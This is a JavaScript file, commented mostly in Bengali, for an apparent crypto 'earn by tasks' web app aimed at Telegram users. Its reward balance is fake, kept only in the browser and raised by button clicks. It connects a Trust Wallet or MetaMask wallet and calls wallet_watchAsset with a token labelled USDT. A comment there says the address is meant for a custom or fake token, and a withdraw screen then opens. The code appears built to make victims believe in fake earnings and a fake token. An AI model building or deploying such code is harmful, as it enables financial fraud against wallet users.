let balance = 0.00;

// Section Switcher
function switchPage(pageId, button) {
    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
    
    document.getElementById(pageId).classList.add('active');
    button.classList.add('active');
    closeWalletModal();
}

// Global Task Reward Handler
function completeTask(reward, btn) {
    balance += reward;
    document.getElementById('user-balance').innerText = "$" + balance.toFixed(2);
    btn.innerText = "Completed";
    btn.disabled = true;
    btn.style.background = "#231e36";
    btn.style.boxShadow = "none";
    btn.style.color = "#6b7280";
}

// Modal Control
function openWalletModal() {
    document.getElementById('walletModal').style.display = 'flex';
}

// Close Modal
function closeWalletModal() {
    document.getElementById('walletModal').style.display = 'none';
}

document.getElementById('walletModal').addEventListener('click', function(e) {
    if (e.target === this) closeWalletModal();
});

/**
 * কোর মেকানিজম: অটো কানেক্ট এবং কাস্টম টোকেন মেইননেটে অ্যাড করার লজিক
 */
async function connectViaApp(walletType) {
    closeWalletModal();
    
    // ১. ইউজার যখন ট্রাস্ট ওয়ালেট বা মেটামাস্কের অফিশিয়াল DApp ব্রাউজারের ভেতর থাকবে
    if (window.ethereum) {
        try {
            // স্টেপ ১: মেইননেট ওয়ালেট কানেক্ট পপ-আপ ট্রিগার (অ্যাড্রেস নেওয়ার জন্য)
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const walletAddress = accounts[0];
            
            // স্টেপ ২: মেইননেটে অটোমেটিক কাস্টম টোকেন (USDT) অ্যাড করার পপ-আপ রিকোয়েস্ট
            // এটি ইউজারের ওয়ালেটে সরাসরি কাস্টম টোকেন ইম্পোর্ট করার অফিশিয়াল প্রম্পট দেখাবে
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // আপনার কাস্টম বা ফেক টোকেনের কন্ট্রাক্ট অ্যাড্রেস (এখানে আসল USDT দেওয়া আছে)
                        symbol: 'USDT', // টোকেন সিম্বল
                        decimals: 6,   // টোকেন ডেসিমেল
                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png', // টোকেন লোগো
                    },
                },
            });

            // সাকসেসফুলি কানেক্ট এবং টোকেন প্রোসেস হলে wallet.html-এ উইথড্র স্ক্রিন অন হবে
            let walletFrame = document.getElementById('wallet').contentWindow;
            if(walletFrame && walletFrame.showWithdrawSection) {
                walletFrame.showWithdrawSection(walletAddress);
            }

        } catch (error) {
            console.error("User rejected the interaction or failed.", error);
            alert("Connection rejected. Please approve the network request in your wallet.");
        }
    } 
    // ২. ইউজার যখন টেলিগ্রামের ভেতর থেকে বাটনে চাপ দেবে (তাকে ওয়ালেটের আসল DApp ব্রাউজারে পুশ করার ডিপ লিঙ্ক)
    else {
        let currentUrl = window.location.href;
        
        if (walletType === 'trust') {
            // ট্রাস্ট ওয়ালেটের অফিশিয়াল ইন-অ্যাপ ব্রাউজার ডিপ লিঙ্ক প্রোটোকল
            // এটি সরাসরি ট্রাস্ট ওয়ালেট ওপেন করে তার নিজস্ব ব্রাউজারে আপনার লিংকটি লোড করবে, ফলে উপরের 'window.ethereum' লজিকটি তখন কাজ করবে।
            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(currentUrl);
        } else if (walletType === 'metamask') {
            // মেটামাস্কের অফিশিয়াল DApp ব্রাউজার ওপেনার লিঙ্ক
            let cleanUrl = currentUrl.replace('https://', '');
            window.location.href = "https://metamask.app.link/dapp/" + cleanUrl;
        } else {
            alert("Please open this app inside Trust Wallet or MetaMask.");
        }
    }
}

// পেজ লোড হওয়ার পর অটো-চেকার (যখন ইউজার ওয়ালেট ব্রাউজার থেকে ব্যাক করবে)
window.addEventListener('load', () => {
    if (window.ethereum) {
        window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
            if (accounts.length > 0) {
                let walletFrame = document.getElementById('wallet').contentWindow;
                if(walletFrame && walletFrame.showWithdrawSection) {
                    walletFrame.showWithdrawSection(accounts[0]);
                }
            }
        }).catch(err => console.log(err));
    }
});
